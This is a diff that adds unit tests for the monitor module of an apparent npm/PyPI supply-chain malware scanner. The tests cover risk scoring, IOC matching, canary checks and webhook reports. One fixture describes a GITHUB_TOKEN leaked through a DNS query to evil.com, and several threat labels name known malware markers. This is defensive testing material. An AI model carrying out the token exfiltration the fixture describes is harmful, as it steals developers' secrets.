@@ -16,7 +16,7 @@ async function runMonitorTests() {
 
   const {
     parseNpmRss, parsePyPIRss, loadState, saveState, STATE_FILE,
-    ALERTS_FILE, extractTarGz, getNpmTarballUrl, getNpmLatestTarball, scanQueue,
+    ALERTS_FILE, extractTarGz, getNpmTarballUrl, getNpmLatestTarball, scanQueue, processQueue,
     appendAlert, timeoutPromise, stats, dailyAlerts, MAX_TARBALL_SIZE,
     KNOWN_BUNDLED_FILES, isBundledToolingOnly,
     isSandboxEnabled, hasHighOrCritical,
@@ -32,7 +32,12 @@ async function runMonitorTests() {
     isVerboseMode, setVerboseMode, hasIOCMatch, IOC_MATCH_TYPES,
     DETECTIONS_FILE, appendDetection, loadDetections, getDetectionStats,
     SCAN_STATS_FILE, loadScanStats, updateScanStats,
-    buildReportFromDisk, buildReportEmbedFromDisk, getReportStatus
+    buildReportFromDisk, buildReportEmbedFromDisk, getReportStatus,
+    trySendWebhook, cleanupOrphanTmpDirs, sendReportNow,
+    consecutivePollErrors, POLL_MAX_BACKOFF,
+    runTemporalAstCheck, runTemporalPublishCheck, runTemporalMaintainerCheck,
+    runTemporalCheck, reportStats, recentlyScanned, sendDailyReport,
+    resolveTarballAndScan, KNOWN_BUNDLED_PATHS
   } = require('../../src/monitor.js');
 
   test('MONITOR: parseNpmRss extracts package names from RSS', () => {
@@ -2179,6 +2184,1770 @@ async function runMonitorTests() {
     assert(result.agg.scanned >= 0, 'scanned should be >= 0');
     assert(result.agg.clean >= 0, 'clean should be >= 0');
     assert(result.agg.suspect >= 0, 'suspect should be >= 0');
+  });
+
+  // ============================================
+  // DETECTION & SCAN STATS TESTS (TEMP FILES)
+  // ============================================
+
+  console.log('\n=== DETECTION & SCAN STATS TESTS ===\n');
+
+  test('MONITOR: loadDetections returns default for missing file', () => {
+    const result = loadDetections();
+    assert(Array.isArray(result.detections), 'Should have detections array');
+  });
+
+  test('MONITOR: getDetectionStats returns correct structure', () => {
+    const stats = getDetectionStats();
+    assert(typeof stats.total === 'number', 'Should have total count');
+    assert(typeof stats.bySeverity === 'object', 'Should have bySeverity');
+    assert(typeof stats.byEcosystem === 'object', 'Should have byEcosystem');
+    // leadTime may be null if no detections have advisory_at
+  });
+
+  test('MONITOR: loadScanStats returns default for missing file', () => {
+    const data = loadScanStats();
+    assert(data.stats, 'Should have stats object');
+    assert(Array.isArray(data.daily), 'Should have daily array');
+    assert(typeof data.stats.total_scanned === 'number', 'Should have total_scanned');
+  });
+
+  test('MONITOR: isBundledToolingOnly returns true for all bundled files', () => {
+    const threats = [
+      { file: 'node_modules/pkg/yarn.js', type: 'obfuscation_detected', severity: 'HIGH' },
+      { file: 'node_modules/pkg/webpack.js', type: 'obfuscation_detected', severity: 'HIGH' }
+    ];
+    assert(isBundledToolingOnly(threats) === true, 'All bundled tooling files should return true');
+  });
+
+  test('MONITOR: isBundledToolingOnly returns false for mixed files', () => {
+    const threats = [
+      { file: 'node_modules/pkg/yarn.js', type: 'obfuscation_detected', severity: 'HIGH' },
+      { file: 'src/index.js', type: 'dangerous_call_eval', severity: 'HIGH' }
+    ];
+    assert(isBundledToolingOnly(threats) === false, 'Mixed files should return false');
+  });
+
+  test('MONITOR: isBundledToolingOnly returns true for Next.js chunks', () => {
+    const threats = [
+      { file: '_next/static/chunks/main.js', type: 'obfuscation_detected', severity: 'MEDIUM' }
+    ];
+    assert(isBundledToolingOnly(threats) === true, 'Next.js chunks should be bundled');
+  });
+
+  test('MONITOR: isBundledToolingOnly returns false for empty threats', () => {
+    assert(isBundledToolingOnly([]) === false, 'Empty threats should return false');
+  });
+
+  test('MONITOR: isBundledToolingOnly returns false when file is null', () => {
+    const threats = [{ type: 'dangerous_call_eval', severity: 'HIGH' }];
+    assert(isBundledToolingOnly(threats) === false, 'Threats without file should return false');
+  });
+
+  test('MONITOR: computeRiskLevel returns correct levels', () => {
+    assert(computeRiskLevel({ critical: 1, high: 0, medium: 0, low: 0 }) === 'CRITICAL');
+    assert(computeRiskLevel({ critical: 0, high: 1, medium: 0, low: 0 }) === 'HIGH');
+    assert(computeRiskLevel({ critical: 0, high: 0, medium: 1, low: 0 }) === 'MEDIUM');
+    assert(computeRiskLevel({ critical: 0, high: 0, medium: 0, low: 1 }) === 'LOW');
+    assert(computeRiskLevel({ critical: 0, high: 0, medium: 0, low: 0 }) === 'CLEAN');
+  });
+
+  test('MONITOR: computeRiskScore caps at 100', () => {
+    const score = computeRiskScore({ critical: 10, high: 10, medium: 10, low: 10 });
+    assert(score === 100, 'Score should be capped at 100, got ' + score);
+  });
+
+  test('MONITOR: computeRiskScore calculates correctly', () => {
+    const score = computeRiskScore({ critical: 1, high: 1, medium: 1, low: 1 });
+    // 25 + 15 + 5 + 1 = 46
+    assert(score === 46, 'Score should be 46, got ' + score);
+  });
+
+  test('MONITOR: isPublishAnomalyOnly returns true when only publish is suspicious', () => {
+    assert(isPublishAnomalyOnly(null, null, { suspicious: true }, null) === true);
+    assert(isPublishAnomalyOnly({ suspicious: false }, null, { suspicious: true }, null) === true);
+  });
+
+  test('MONITOR: isPublishAnomalyOnly returns false when combined with other anomalies', () => {
+    assert(isPublishAnomalyOnly({ suspicious: true }, null, { suspicious: true }, null) === false);
+    assert(isPublishAnomalyOnly(null, { suspicious: true }, { suspicious: true }, null) === false);
+    assert(isPublishAnomalyOnly(null, null, { suspicious: true }, { suspicious: true }) === false);
+  });
+
+  test('MONITOR: isPublishAnomalyOnly returns false when publish is not suspicious', () => {
+    assert(isPublishAnomalyOnly(null, null, null, null) === false);
+    assert(isPublishAnomalyOnly(null, null, { suspicious: false }, null) === false);
+  });
+
+  test('MONITOR: isCanaryEnabled defaults to true', () => {
+    const orig = process.env.MUADDIB_MONITOR_CANARY;
+    delete process.env.MUADDIB_MONITOR_CANARY;
+    try {
+      assert(isCanaryEnabled() === true, 'Should default to true');
+    } finally {
+      if (orig !== undefined) process.env.MUADDIB_MONITOR_CANARY = orig;
+    }
+  });
+
+  test('MONITOR: isCanaryEnabled returns false when env=false', () => {
+    const orig = process.env.MUADDIB_MONITOR_CANARY;
+    process.env.MUADDIB_MONITOR_CANARY = 'false';
+    try {
+      assert(isCanaryEnabled() === false, 'Should return false');
+    } finally {
+      if (orig !== undefined) process.env.MUADDIB_MONITOR_CANARY = orig;
+      else delete process.env.MUADDIB_MONITOR_CANARY;
+    }
+  });
+
+  test('MONITOR: buildCanaryExfiltrationWebhookEmbed has correct structure', () => {
+    const embed = buildCanaryExfiltrationWebhookEmbed('evil-pkg', '1.0.0', [
+      { token: 'GITHUB_TOKEN', foundIn: 'DNS query to evil.com' }
+    ]);
+    assert(embed.embeds, 'Should have embeds');
+    const e = embed.embeds[0];
+    assertIncludes(e.title, 'CANARY EXFILTRATION', 'Title should mention canary');
+    assert(e.color === 0xe74c3c, 'Color should be red');
+    const pkgField = e.fields.find(f => f.name === 'Package');
+    assertIncludes(pkgField.value, 'evil-pkg', 'Should contain package name');
+  });
+
+  // ============================================
+  // EXTENDED COVERAGE TESTS
+  // ============================================
+
+  console.log('\n=== MONITOR EXTENDED COVERAGE TESTS ===\n');
+
+  // --- cleanupOrphanTmpDirs ---
+
+  test('MONITOR: cleanupOrphanTmpDirs does not throw on empty dir', () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'monitor-cleanup-'));
+    try {
+      cleanupOrphanTmpDirs();
+    } catch (err) {
+      assert(false, 'Should not throw: ' + err.message);
+    } finally {
+      try { fs.rmdirSync(tmpDir); } catch {}
+    }
+  });
+
+  test('MONITOR: cleanupOrphanTmpDirs cleans up orphan dirs', () => {
+    const tmpBase = path.join(os.tmpdir(), 'muaddib-monitor');
+    if (!fs.existsSync(tmpBase)) fs.mkdirSync(tmpBase, { recursive: true });
+    const orphanDir = path.join(tmpBase, 'orphan-test-' + Date.now());
+    fs.mkdirSync(orphanDir, { recursive: true });
+    fs.writeFileSync(path.join(orphanDir, 'dummy.txt'), 'test');
+    assert(fs.existsSync(orphanDir), 'Orphan dir should exist before cleanup');
+    cleanupOrphanTmpDirs();
+    assert(!fs.existsSync(orphanDir), 'Orphan dir should be cleaned up');
+  });
+
+  test('MONITOR: cleanupOrphanTmpDirs does not throw when tmpBase does not exist', () => {
+    // cleanupOrphanTmpDirs checks if the dir exists first; if not, it returns early
+    // This just verifies no crash when the base dir is missing
+    try {
+      cleanupOrphanTmpDirs();
+    } catch (err) {
+      assert(false, 'Should not throw: ' + err.message);
+    }
+  });
+
+  // --- sendReportNow ---
+
+  await asyncTest('MONITOR: sendReportNow returns not configured when no webhook', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    delete process.env.MUADDIB_WEBHOOK_URL;
+    try {
+      const result = await sendReportNow();
+      assert(result.sent === false, 'Should not have sent');
+      assertIncludes(result.message, 'not configured', 'Should mention not configured');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+    }
+  });
+
+  await asyncTest('MONITOR: sendReportNow returns no data when no scan stats', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
+    try {
+      const result = await sendReportNow();
+      // If there's no scan data on disk, it should return { sent: false, message: 'No data to report' }
+      // OR it could succeed if there is existing scan data from previous tests
+      assert(typeof result === 'object', 'Should return an object');
+      assert(typeof result.sent === 'boolean', 'Should have sent field');
+      assert(typeof result.message === 'string', 'Should have message field');
+    } finally {
+      if (origEnv !== undefined) {
+        process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      } else {
+        delete process.env.MUADDIB_WEBHOOK_URL;
+      }
+    }
+  });
+
+  // --- buildReportFromDisk extended ---
+
+  test('MONITOR: buildReportFromDisk returns object with expected fields', () => {
+    const report = buildReportFromDisk();
+    assert(typeof report === 'object', 'Should return object');
+    assert(typeof report.hasData === 'boolean', 'Should have hasData field');
+    assert(typeof report.agg === 'object', 'Should have agg field');
+    assert(typeof report.agg.scanned === 'number', 'agg.scanned should be number');
+    assert(typeof report.agg.clean === 'number', 'agg.clean should be number');
+    assert(typeof report.agg.suspect === 'number', 'agg.suspect should be number');
+    assert(Array.isArray(report.top3), 'top3 should be array');
+  });
+
+  test('MONITOR: buildReportEmbedFromDisk returns null or embed', () => {
+    const result = buildReportEmbedFromDisk();
+    // Returns null when no data, or an embed object when data exists
+    assert(result === null || (typeof result === 'object' && result.embeds), 'Should return null or embed');
+  });
+
+  test('MONITOR: getReportStatus has expected fields', () => {
+    const status = getReportStatus();
+    assert(typeof status === 'object', 'Should return object');
+    assert(typeof status.lastDailyReportDate === 'string' || status.lastDailyReportDate === null, 'Should have lastDailyReportDate');
+    assert(typeof status.scannedSince === 'number', 'Should have scannedSince');
+    assert(typeof status.nextReport === 'string', 'Should have nextReport');
+  });
+
+  // --- consecutivePollErrors accessor ---
+
+  test('MONITOR: consecutivePollErrors getter/setter works', () => {
+    const original = consecutivePollErrors.get();
+    consecutivePollErrors.set(5);
+    assert(consecutivePollErrors.get() === 5, 'Should be 5 after set');
+    consecutivePollErrors.set(0);
+    assert(consecutivePollErrors.get() === 0, 'Should be 0 after reset');
+    consecutivePollErrors.set(original); // restore
+  });
+
+  // --- POLL_MAX_BACKOFF ---
+
+  test('MONITOR: POLL_MAX_BACKOFF is a positive number', () => {
+    assert(typeof POLL_MAX_BACKOFF === 'number', 'Should be number');
+    assert(POLL_MAX_BACKOFF > 0, 'Should be positive');
+    assert(POLL_MAX_BACKOFF === 960000, 'Should be 960000 (16 minutes)');
+  });
+
+  // --- reportStats ---
+
+  test('MONITOR: reportStats does not throw and updates lastReportTime', () => {
+    const origLog = console.log;
+    let logOutput = '';
+    console.log = (...args) => { logOutput += args.join(' '); };
+    const beforeTime = Date.now();
+    try {
+      reportStats();
+      assert(stats.lastReportTime >= beforeTime, 'lastReportTime should be updated');
+      assertIncludes(logOutput, '[MONITOR] Stats:', 'Should log stats');
+    } finally {
+      console.log = origLog;
+    }
+  });
+
+  // --- trySendWebhook ---
+
+  await asyncTest('MONITOR: trySendWebhook does nothing when shouldSendWebhook returns false', async () => {
+    // No webhook URL set = shouldSendWebhook returns false
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    delete process.env.MUADDIB_WEBHOOK_URL;
+    const origLog = console.log;
+    let logOutput = '';
+    console.log = (...args) => { logOutput += args.join(' '); };
+    try {
+      const result = { summary: { critical: 0, high: 0, medium: 1, low: 0, total: 1 }, threats: [] };
+      await trySendWebhook('test-pkg', '1.0.0', 'npm', result, null);
+      // Should return without sending (no webhook URL)
+    } finally {
+      console.log = origLog;
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+    }
+  });
+
+  await asyncTest('MONITOR: trySendWebhook logs false positive when sandbox score is 0', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    delete process.env.MUADDIB_WEBHOOK_URL;
+    const origLog = console.log;
+    let logOutput = '';
+    console.log = (...args) => { logOutput += args.join(' '); };
+    try {
+      const result = { summary: { critical: 1, high: 0, medium: 0, low: 0, total: 1 }, threats: [{ type: 'test', severity: 'CRITICAL' }] };
+      const sandboxResult = { score: 0, severity: 'CLEAN' };
+      await trySendWebhook('test-pkg', '1.0.0', 'npm', result, sandboxResult);
+      assertIncludes(logOutput, 'FALSE POSITIVE', 'Should log false positive');
+    } finally {
+      console.log = origLog;
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+    }
+  });
+
+  // --- runTemporalAstCheck ---
+
+  await asyncTest('MONITOR: runTemporalAstCheck returns null when disabled', async () => {
+    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_AST;
+    process.env.MUADDIB_MONITOR_TEMPORAL_AST = 'false';
+    try {
+      const result = await runTemporalAstCheck('express');
+      assert(result === null, 'Should return null when disabled');
+    } finally {
+      if (origEnv !== undefined) {
+        process.env.MUADDIB_MONITOR_TEMPORAL_AST = origEnv;
+      } else {
+        delete process.env.MUADDIB_MONITOR_TEMPORAL_AST;
+      }
+    }
+  });
+
+  // --- runTemporalPublishCheck ---
+
+  await asyncTest('MONITOR: runTemporalPublishCheck returns null when disabled', async () => {
+    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
+    process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = 'false';
+    try {
+      const result = await runTemporalPublishCheck('express');
+      assert(result === null, 'Should return null when disabled');
+    } finally {
+      if (origEnv !== undefined) {
+        process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = origEnv;
+      } else {
+        delete process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
+      }
+    }
+  });
+
+  // --- runTemporalMaintainerCheck ---
+
+  await asyncTest('MONITOR: runTemporalMaintainerCheck returns null when disabled', async () => {
+    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
+    process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = 'false';
+    try {
+      const result = await runTemporalMaintainerCheck('express');
+      assert(result === null, 'Should return null when disabled');
+    } finally {
+      if (origEnv !== undefined) {
+        process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = origEnv;
+      } else {
+        delete process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
+      }
+    }
+  });
+
+  // --- runTemporalCheck ---
+
+  await asyncTest('MONITOR: runTemporalCheck returns null when disabled', async () => {
+    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL;
+    process.env.MUADDIB_MONITOR_TEMPORAL = 'false';
+    try {
+      const result = await runTemporalCheck('express');
+      assert(result === null, 'Should return null when disabled');
+    } finally {
+      if (origEnv !== undefined) {
+        process.env.MUADDIB_MONITOR_TEMPORAL = origEnv;
+      } else {
+        delete process.env.MUADDIB_MONITOR_TEMPORAL;
+      }
+    }
+  });
+
+  // --- recentlyScanned ---
+
+  test('MONITOR: recentlyScanned is a Set', () => {
+    assert(recentlyScanned instanceof Set, 'Should be a Set');
+  });
+
+  test('MONITOR: recentlyScanned add/has/delete works', () => {
+    const key = 'npm/test-recentlyscanned-pkg@9.9.9';
+    recentlyScanned.add(key);
+    assert(recentlyScanned.has(key), 'Should have the key after add');
+    recentlyScanned.delete(key);
+    assert(!recentlyScanned.has(key), 'Should not have the key after delete');
+  });
+
+  // --- KNOWN_BUNDLED_PATHS ---
+
+  test('MONITOR: KNOWN_BUNDLED_PATHS is a non-empty array of strings', () => {
+    assert(Array.isArray(KNOWN_BUNDLED_PATHS), 'Should be array');
+    assert(KNOWN_BUNDLED_PATHS.length > 0, 'Should not be empty');
+    for (const p of KNOWN_BUNDLED_PATHS) {
+      assert(typeof p === 'string', 'Each entry should be a string');
+    }
+  });
+
+  // --- sendDailyReport ---
+
+  await asyncTest('MONITOR: sendDailyReport does nothing when no webhook URL', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    delete process.env.MUADDIB_WEBHOOK_URL;
+    const origLog = console.log;
+    const origErr = console.error;
+    console.log = () => {};
+    console.error = () => {};
+    // Save stats state
+    const origScanned = stats.scanned;
+    const origClean = stats.clean;
+    const origSuspect = stats.suspect;
+    const origErrors = stats.errors;
+    try {
+      await sendDailyReport();
+      // sendDailyReport resets counters even when no URL (after the check)
+      // The function checks url first, returns if not set, so counters remain unchanged
+    } finally {
+      console.log = origLog;
+      console.error = origErr;
+      // Restore stats
+      stats.scanned = origScanned;
+      stats.clean = origClean;
+      stats.suspect = origSuspect;
+      stats.errors = origErrors;
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+    }
+  });
+
+  // --- buildDailyReportEmbed ---
+
+  test('MONITOR: buildDailyReportEmbed returns correct structure', () => {
+    const origLog = console.log;
+    console.log = () => {};
+    try {
+      const embed = buildDailyReportEmbed();
+      assert(embed.embeds, 'Should have embeds');
+      assert(embed.embeds.length === 1, 'Should have one embed');
+      const e = embed.embeds[0];
+      assertIncludes(e.title, 'Daily Report', 'Title should mention Daily Report');
+      assert(e.color === 0x3498db, 'Color should be blue');
+      assert(Array.isArray(e.fields), 'Should have fields array');
+      const scannedField = e.fields.find(f => f.name === 'Packages Scanned');
+      assert(scannedField, 'Should have Packages Scanned field');
+      const cleanField = e.fields.find(f => f.name === 'Clean');
+      assert(cleanField, 'Should have Clean field');
+      const suspectsField = e.fields.find(f => f.name === 'Suspects');
+      assert(suspectsField, 'Should have Suspects field');
+    } finally {
+      console.log = origLog;
+    }
+  });
+
+  // --- trySendWebhook with webhook URL but no IOC match and no sandbox ---
+
+  await asyncTest('MONITOR: trySendWebhook skips when no IOC match and no sandbox', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
+    const origLog = console.log;
+    let logOutput = '';
+    console.log = (...args) => { logOutput += args.join(' '); };
+    try {
+      const result = {
+        summary: { critical: 0, high: 1, medium: 0, low: 0, total: 1 },
+        threats: [{ type: 'suspicious_pattern', severity: 'HIGH' }]
+      };
+      // No sandbox result, no IOC match => shouldSendWebhook returns false
+      await trySendWebhook('test-pkg', '1.0.0', 'npm', result, null);
+      // Should not have sent a webhook
+    } finally {
+      console.log = origLog;
+      if (origEnv !== undefined) {
+        process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      } else {
+        delete process.env.MUADDIB_WEBHOOK_URL;
+      }
+    }
+  });
+
+  // --- resolveTarballAndScan dedup check ---
+
+  await asyncTest('MONITOR: resolveTarballAndScan skips already scanned packages', async () => {
+    const origLog = console.log;
+    let logOutput = '';
+    console.log = (...args) => { logOutput += args.join(' '); };
+    try {
+      const dedupeKey = 'npm/dedup-test-pkg@1.0.0';
+      recentlyScanned.add(dedupeKey);
+      const item = {
+        name: 'dedup-test-pkg',
+        version: '1.0.0',
+        ecosystem: 'npm',
+        tarballUrl: 'https://example.com/fake.tgz'
+      };
+      await resolveTarballAndScan(item);
+      assertIncludes(logOutput, 'already scanned', 'Should log already scanned');
+    } finally {
+      console.log = origLog;
+      recentlyScanned.delete('npm/dedup-test-pkg@1.0.0');
+    }
+  });
+
+  // --- getNpmTarballUrl ---
+
+  test('MONITOR: getNpmTarballUrl extracts tarball from dist', () => {
+    const url = getNpmTarballUrl({ dist: { tarball: 'https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz' } });
+    assert(url === 'https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz', 'Should extract tarball URL');
+  });
+
+  test('MONITOR: getNpmTarballUrl returns null when no dist', () => {
+    const url = getNpmTarballUrl({});
+    assert(url === null, 'Should return null for missing dist');
+  });
+
+  test('MONITOR: getNpmTarballUrl returns null when dist has no tarball', () => {
+    const url = getNpmTarballUrl({ dist: {} });
+    assert(url === null, 'Should return null for missing tarball in dist');
+  });
+
+  // --- hasIOCMatch extended ---
+
+  test('MONITOR: hasIOCMatch returns true for known_malicious_hash', () => {
+    const result = {
+      threats: [{ type: 'known_malicious_hash', severity: 'CRITICAL' }]
+    };
+    assert(hasIOCMatch(result) === true, 'Should detect known_malicious_hash');
+  });
+
+  test('MONITOR: hasIOCMatch returns true for shai_hulud_marker', () => {
+    const result = {
+      threats: [{ type: 'shai_hulud_marker', severity: 'CRITICAL' }]
+    };
+    assert(hasIOCMatch(result) === true, 'Should detect shai_hulud_marker');
+  });
+
+  test('MONITOR: hasIOCMatch returns true for shai_hulud_backdoor', () => {
+    const result = {
+      threats: [{ type: 'shai_hulud_backdoor', severity: 'CRITICAL' }]
+    };
+    assert(hasIOCMatch(result) === true, 'Should detect shai_hulud_backdoor');
+  });
+
+  test('MONITOR: hasIOCMatch returns true for pypi_malicious_package', () => {
+    const result = {
+      threats: [{ type: 'pypi_malicious_package', severity: 'CRITICAL' }]
+    };
+    assert(hasIOCMatch(result) === true, 'Should detect pypi_malicious_package');
+  });
+
+  test('MONITOR: hasIOCMatch returns false for null result', () => {
+    assert(hasIOCMatch(null) === false, 'Should return false for null');
+  });
+
+  test('MONITOR: hasIOCMatch returns false for result with no threats', () => {
+    assert(hasIOCMatch({ threats: null }) === false, 'Should return false for null threats');
+  });
+
+  // --- IOC_MATCH_TYPES ---
+
+  test('MONITOR: IOC_MATCH_TYPES contains all expected types', () => {
+    assert(IOC_MATCH_TYPES.has('known_malicious_package'), 'Should have known_malicious_package');
+    assert(IOC_MATCH_TYPES.has('known_malicious_hash'), 'Should have known_malicious_hash');
+    assert(IOC_MATCH_TYPES.has('pypi_malicious_package'), 'Should have pypi_malicious_package');
+    assert(IOC_MATCH_TYPES.has('shai_hulud_marker'), 'Should have shai_hulud_marker');
+    assert(IOC_MATCH_TYPES.has('shai_hulud_backdoor'), 'Should have shai_hulud_backdoor');
+    assert(IOC_MATCH_TYPES.size === 5, 'Should have exactly 5 types, got ' + IOC_MATCH_TYPES.size);
+  });
+
+  // --- computeRiskScore extended ---
+
+  test('MONITOR: computeRiskScore caps at 100', () => {
+    const score = computeRiskScore({ critical: 10, high: 10, medium: 10, low: 10 });
+    assert(score === 100, 'Should cap at 100, got ' + score);
+  });
+
+  test('MONITOR: computeRiskScore returns 0 for clean', () => {
+    const score = computeRiskScore({ critical: 0, high: 0, medium: 0, low: 0 });
+    assert(score === 0, 'Should be 0 for clean');
+  });
+
+  test('MONITOR: computeRiskScore computes correct value for single critical', () => {
+    const score = computeRiskScore({ critical: 1, high: 0, medium: 0, low: 0 });
+    assert(score === 25, 'Should be 25 for one critical');
+  });
+
+  test('MONITOR: computeRiskScore computes correct value for mixed findings', () => {
+    const score = computeRiskScore({ critical: 0, high: 1, medium: 2, low: 3 });
+    // 0*25 + 1*15 + 2*5 + 3*1 = 28
+    assert(score === 28, 'Should be 28, got ' + score);
+  });
+
+  // --- computeRiskLevel extended ---
+
+  test('MONITOR: computeRiskLevel returns MEDIUM for medium only', () => {
+    const level = computeRiskLevel({ critical: 0, high: 0, medium: 1, low: 0 });
+    assert(level === 'MEDIUM', 'Should be MEDIUM');
+  });
+
+  test('MONITOR: computeRiskLevel returns LOW for low only', () => {
+    const level = computeRiskLevel({ critical: 0, high: 0, medium: 0, low: 1 });
+    assert(level === 'LOW', 'Should be LOW');
+  });
+
+  test('MONITOR: computeRiskLevel returns CLEAN for no findings', () => {
+    const level = computeRiskLevel({ critical: 0, high: 0, medium: 0, low: 0 });
+    assert(level === 'CLEAN', 'Should be CLEAN');
+  });
+
+  // --- shouldSendWebhook extended ---
+
+  test('MONITOR: shouldSendWebhook returns true for sandbox score > 0 with webhook URL', () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
+    try {
+      const result = { summary: { critical: 0, high: 0, medium: 0, low: 0, total: 0 }, threats: [] };
+      const sandboxResult = { score: 5, severity: 'HIGH' };
+      assert(shouldSendWebhook(result, sandboxResult) === true, 'Should return true for sandbox score > 0');
+    } finally {
+      if (origEnv !== undefined) {
+        process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      } else {
+        delete process.env.MUADDIB_WEBHOOK_URL;
+      }
+    }
+  });
+
+  test('MONITOR: shouldSendWebhook returns false for sandbox score = 0', () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
+    try {
+      const result = { summary: { critical: 1, high: 0, medium: 0, low: 0, total: 1 }, threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }] };
+      const sandboxResult = { score: 0, severity: 'CLEAN' };
+      assert(shouldSendWebhook(result, sandboxResult) === false, 'Sandbox score 0 should override IOC match');
+    } finally {
+      if (origEnv !== undefined) {
+        process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      } else {
+        delete process.env.MUADDIB_WEBHOOK_URL;
+      }
+    }
+  });
+
+  test('MONITOR: shouldSendWebhook returns true for IOC match without sandbox', () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
+    try {
+      const result = { threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }] };
+      assert(shouldSendWebhook(result, null) === true, 'Should send for IOC match without sandbox');
+    } finally {
+      if (origEnv !== undefined) {
+        process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      } else {
+        delete process.env.MUADDIB_WEBHOOK_URL;
+      }
+    }
+  });
+
+  // --- buildMonitorWebhookPayload extended ---
+
+  test('MONITOR: buildMonitorWebhookPayload includes sandbox when score > 0', () => {
+    const result = {
+      threats: [{ type: 'known_malicious_package', severity: 'CRITICAL', rule_id: 'MUADDIB-IOC-001' }]
+    };
+    const sandboxResult = { score: 8, severity: 'CRITICAL', findings: [] };
+    const payload = buildMonitorWebhookPayload('evil-pkg', '2.0.0', 'npm', result, sandboxResult);
+    assert(payload.sandbox, 'Should include sandbox');
+    assert(payload.sandbox.score === 8, 'Sandbox score should be 8');
+    assert(payload.sandbox.severity === 'CRITICAL', 'Sandbox severity should be CRITICAL');
+  });
+
+  test('MONITOR: buildMonitorWebhookPayload has no sandbox when sandbox score 0', () => {
+    const result = {
+      threats: [{ type: 'test', severity: 'HIGH' }]
+    };
+    const sandboxResult = { score: 0, severity: 'CLEAN' };
+    const payload = buildMonitorWebhookPayload('pkg', '1.0.0', 'npm', result, sandboxResult);
+    assert(!payload.sandbox, 'Should not include sandbox when score is 0');
+  });
+
+  // --- isPublishAnomalyOnly extended ---
+
+  test('MONITOR: isPublishAnomalyOnly returns false when no suspicious results', () => {
+    assert(isPublishAnomalyOnly(null, null, null, null) === false, 'Should be false with all null');
+  });
+
+  test('MONITOR: isPublishAnomalyOnly returns false when lifecycle is also suspicious', () => {
+    const temporal = { suspicious: true };
+    const publish = { suspicious: true };
+    assert(isPublishAnomalyOnly(temporal, null, publish, null) === false, 'Should be false when lifecycle also suspicious');
+  });
+
+  test('MONITOR: isPublishAnomalyOnly returns false when ast is also suspicious', () => {
+    const ast = { suspicious: true };
+    const publish = { suspicious: true };
+    assert(isPublishAnomalyOnly(null, ast, publish, null) === false, 'Should be false when AST also suspicious');
+  });
+
+  test('MONITOR: isPublishAnomalyOnly returns false when maintainer is also suspicious', () => {
+    const publish = { suspicious: true };
+    const maintainer = { suspicious: true };
+    assert(isPublishAnomalyOnly(null, null, publish, maintainer) === false, 'Should be false when maintainer also suspicious');
+  });
+
+  test('MONITOR: isPublishAnomalyOnly returns true when only publish is suspicious', () => {
+    const publish = { suspicious: true };
+    assert(isPublishAnomalyOnly(null, null, publish, null) === true, 'Should be true when only publish is suspicious');
+    assert(isPublishAnomalyOnly({ suspicious: false }, { suspicious: false }, publish, { suspicious: false }) === true,
+      'Should be true when others have suspicious: false');
+  });
+
+  // --- updateScanStats extended ---
+
+  test('MONITOR: updateScanStats increments total_scanned', () => {
+    const before = loadScanStats();
+    const beforeTotal = before.stats.total_scanned;
+    updateScanStats('clean');
+    const after = loadScanStats();
+    assert(after.stats.total_scanned === beforeTotal + 1, 'total_scanned should increment');
+    assert(after.stats.clean === before.stats.clean + 1, 'clean should increment');
+  });
+
+  test('MONITOR: updateScanStats tracks false_positive', () => {
+    const before = loadScanStats();
+    const beforeFP = before.stats.false_positive;
+    updateScanStats('false_positive');
+    const after = loadScanStats();
+    assert(after.stats.false_positive === beforeFP + 1, 'false_positive should increment');
+  });
+
+  test('MONITOR: updateScanStats tracks confirmed', () => {
+    const before = loadScanStats();
+    const beforeConfirmed = before.stats.confirmed_malicious;
+    updateScanStats('confirmed');
+    const after = loadScanStats();
+    assert(after.stats.confirmed_malicious === beforeConfirmed + 1, 'confirmed_malicious should increment');
+  });
+
+  test('MONITOR: updateScanStats creates daily entries', () => {
+    const data = loadScanStats();
+    const today = new Date().toISOString().slice(0, 10);
